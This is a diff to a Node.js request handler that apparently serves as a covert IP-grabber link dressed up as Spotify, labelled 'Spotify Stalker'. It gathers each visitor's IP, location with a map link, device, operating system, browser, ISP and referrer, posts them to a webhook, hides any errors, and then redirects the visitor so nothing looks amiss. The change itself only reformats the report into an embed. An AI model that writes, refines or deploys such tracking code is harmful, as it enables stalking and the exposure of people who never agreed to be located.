@@ -119,38 +119,25 @@ module.exports = async (req, res) => {
     const mapsLink = geo.lat ? 'https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon : '';
 
     const now = new Date();
-    const lines = [
-      '**Spotify Stalkeri !!!**',
-      '',
-      ':round_pushpin: **Konum**',
-      flag + ' ' + konum,
-      mapsLink ? '[Haritada göster](' + mapsLink + ')' : '',
-      '',
-      ':id: **IP**',
-      ip,
-      '',
-      ':mobile_phone: **Cihaz**',
-      device,
-      '',
-      ':desktop: **İşletim Sistemi**',
-      os,
-      '',
-      ':globe_with_meridians: **Tarayıcı**',
-      browser,
-      '',
-      ':satellite: **ISS**',
-      geo.isp || geo.org || 'Bilinmiyor',
-      '',
-      ':link: **Yönlendiren**',
-      source,
-      '',
-      ':alarm_clock: **Tarih**',
-      fmtDate(now),
-      '',
-      'Spotify Stalker · 37xw • ' + relDate(now)
+    const fields = [
+      { name: ':round_pushpin: Konum', value: flag + ' ' + konum + (mapsLink ? '\n[Haritada göster](' + mapsLink + ')' : ''), inline: false },
+      { name: ':id: IP', value: ip, inline: true },
+      { name: ':mobile_phone: Cihaz', value: device, inline: true },
+      { name: ':desktop: İşletim Sistemi', value: os, inline: true },
+      { name: ':globe_with_meridians: Tarayıcı', value: browser, inline: true },
+      { name: ':satellite: ISS', value: geo.isp || geo.org || 'Bilinmiyor', inline: true },
+      { name: ':link: Yönlendiren', value: source, inline: false },
+      { name: ':alarm_clock: Tarih', value: fmtDate(now), inline: true }
     ];
 
-    await postJSON(WEBHOOK, { content: lines.filter(l => l !== '').join('\n') });
+    await postJSON(WEBHOOK, {
+      embeds: [{
+        title: 'Spotify Stalkeri !!!',
+        color: 0x1DB954,
+        fields: fields,
+        footer: { text: 'Spotify Stalker \u00b7 37xw \u2022 ' + relDate(now) }
+      }]
+    });
   } catch(e) {}
 
   res.writeHead(302, { Location: REDIRECT });
